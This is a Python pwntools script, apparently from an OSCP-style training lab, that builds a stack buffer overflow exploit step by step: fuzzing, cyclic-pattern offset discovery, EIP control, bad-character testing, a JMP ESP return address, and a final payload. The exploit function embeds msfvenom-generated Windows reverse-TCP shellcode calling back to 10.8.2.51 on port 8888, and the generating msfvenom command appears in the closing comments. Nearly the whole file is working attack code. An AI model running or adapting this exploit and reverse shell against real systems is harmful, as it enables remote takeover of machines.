#!/usr/bin/python3
from pwn import *

def fuzzing(ip,port):
    """#Fuzzing"""
    try:
        value = 100
        while True:
            r = remote(str(ip),int(port))
            r.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.\n")
            data = "A"*value
            r.sendline(f"OVERFLOW1 {data}")
            print(str(value)+" ",end="")
            print(r.recvuntil("\n").decode())
            r.close()
            value += 100
    except:
        print(value)
def find_exact_eip_location(ip,port):

    #Finding exact location EIP

    r = remote(str(ip),int(port))
    r.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.\n")
    pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
    r.sendline(f"OVERFLOW1 {pattern}")
    print("Pattern Sent...")
    r.close()

    # EIP value : 6F43396E 
    # EIP VALUE : 1978
def eip_test_and_buffer_increase(ip,port):
    # Trying to land BBBB to $EIP in by this test and also check whether we could increase the stack size to accumulate shellcode

    r = remote(str(ip),int(port))
    r.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.\n")
    junk = "A"*1978
    eip = "B"*4
    shellcode = "C"*500
    payload = junk + eip + shellcode
    r.sendline(f"OVERFLOW1 {payload}")
    print("Payload Sent...")
    r.close()
def finding_bad_chars(ip,port):
    # We need to find the badchars for this binary which include \x00
    #\x00\x07\x2e\xa0

    badchars = ("\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
                "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
                "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
                "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
                "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
                "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
                "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
                "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
                "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
                "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
                "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
                "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
                "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
                "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
                "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
                "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 
    r = remote(str(ip),int(port))
    r.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.\n")
    junk = "A"*1978
    eip = "B"*4
    payload = junk + eip + badchars
    r.sendline(f"OVERFLOW1 {payload}")
    print("Bad chars sent ...")
    r.close()
def exploit(ip,port):
    # We are now ready to get a revshell with the bufferoverflow exploit
    # We use a bufferoverflow reverse_tcp payload with msfvenom with the badchars

    shellcode = ("\xd9\xc8\xd9\x74\x24\xf4\xbb\xbb\x4a\x13\x87\x5a\x33\xc9\xb1"
                "\x52\x31\x5a\x17\x83\xea\xfc\x03\xe1\x59\xf1\x72\xe9\xb6\x77"
                "\x7c\x11\x47\x18\xf4\xf4\x76\x18\x62\x7d\x28\xa8\xe0\xd3\xc5"
                "\x43\xa4\xc7\x5e\x21\x61\xe8\xd7\x8c\x57\xc7\xe8\xbd\xa4\x46"
                "\x6b\xbc\xf8\xa8\x52\x0f\x0d\xa9\x93\x72\xfc\xfb\x4c\xf8\x53"
                "\xeb\xf9\xb4\x6f\x80\xb2\x59\xe8\x75\x02\x5b\xd9\x28\x18\x02"
                "\xf9\xcb\xcd\x3e\xb0\xd3\x12\x7a\x0a\x68\xe0\xf0\x8d\xb8\x38"
                "\xf8\x22\x85\xf4\x0b\x3a\xc2\x33\xf4\x49\x3a\x40\x89\x49\xf9"
                "\x3a\x55\xdf\x19\x9c\x1e\x47\xc5\x1c\xf2\x1e\x8e\x13\xbf\x55"
                "\xc8\x37\x3e\xb9\x63\x43\xcb\x3c\xa3\xc5\x8f\x1a\x67\x8d\x54"
                "\x02\x3e\x6b\x3a\x3b\x20\xd4\xe3\x99\x2b\xf9\xf0\x93\x76\x96"
                "\x35\x9e\x88\x66\x52\xa9\xfb\x54\xfd\x01\x93\xd4\x76\x8c\x64"
                "\x1a\xad\x68\xfa\xe5\x4e\x89\xd3\x21\x1a\xd9\x4b\x83\x23\xb2"
                "\x8b\x2c\xf6\x15\xdb\x82\xa9\xd5\x8b\x62\x1a\xbe\xc1\x6c\x45"
                "\xde\xea\xa6\xee\x75\x11\x21\x1b\x82\x1b\x82\x73\x90\x1b\xc6"
                "\x3b\x1d\xfd\x6c\x2c\x48\x56\x19\xd5\xd1\x2c\xb8\x1a\xcc\x49"
                "\xfa\x91\xe3\xae\xb5\x51\x89\xbc\x22\x92\xc4\x9e\xe5\xad\xf2"
                "\xb6\x6a\x3f\x99\x46\xe4\x5c\x36\x11\xa1\x93\x4f\xf7\x5f\x8d"
                "\xf9\xe5\x9d\x4b\xc1\xad\x79\xa8\xcc\x2c\x0f\x94\xea\x3e\xc9"
                "\x15\xb7\x6a\x85\x43\x61\xc4\x63\x3a\xc3\xbe\x3d\x91\x8d\x56"
                "\xbb\xd9\x0d\x20\xc4\x37\xf8\xcc\x75\xee\xbd\xf3\xba\x66\x4a"
                "\x8c\xa6\x16\xb5\x47\x63\x26\xfc\xc5\xc2\xaf\x59\x9c\x56\xb2"
                "\x59\x4b\x94\xcb\xd9\x79\x65\x28\xc1\x08\x60\x74\x45\xe1\x18"
                "\xe5\x20\x05\x8e\x06\x61")
    r = remote(str(ip),int(port))
    r.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.\n")
    junk = "A"*1978
    # The JMP ESP instruction "0x625011af"
    eip = "\xaf\x11\x50\x62"
    nops = "\x90" * 16
    payload = junk + eip + nops + shellcode
    r.sendline(f"OVERFLOW1 {payload}")
    print("Exploit sent ...")
    r.close()

#fuzzing("10.10.60.37",1337)
""" We try to send a huge buffer in multiple of 100 to find if we manage to crash the program."""
""" We crash the program by sending 2000 characters as buffer"""


#find_exact_eip_location("10.10.60.37",1337)
""" We generate and send a 2000 characters unique pattern using msf_pattern_create.rb"""
""" And find out the exact crash location by finding out the EIP value"""
""" We find out the $EIP = 6F43396E and the EIP offset = 1978"""


#eip_test_and_buffer_increase("10.10.60.37",1337)
""" We now use the avobe data and try to land exact 4 B's in the EIP"""
""" We also try to increase the stack size to allow to accumulate the space for shellcode"""

""" Now we need to find the badchars for this binary by sending a huge payload of badchars"""
#finding_bad_chars("10.10.60.37",1337)
""" Found Badchars = \x00\x07\x2e\xa0"""


""" Now, Our target is to set eip value to JMP ESP"""
""" As, to execute our shellcode located in the stack"""
""" JMP ESP value in hex using nasm_shell = 00000000  FFE4              jmp esp"""
""" mona.py command for immunity bottom !mona jmp -r esp -cpb "\x00" """
""" Found a JMP ESP call on 0x625011af with ASLR,SEH,OS are false on essfunc.dll"""

"""msfvenom -p windows/shell_reverse_tcp LHOST=10.8.2.51 LPORT=8888 -e x86/shikata_ga_nai -f c -b "\x00\x07\x2e\xa0" """
#exploit("10.10.60.37",1337)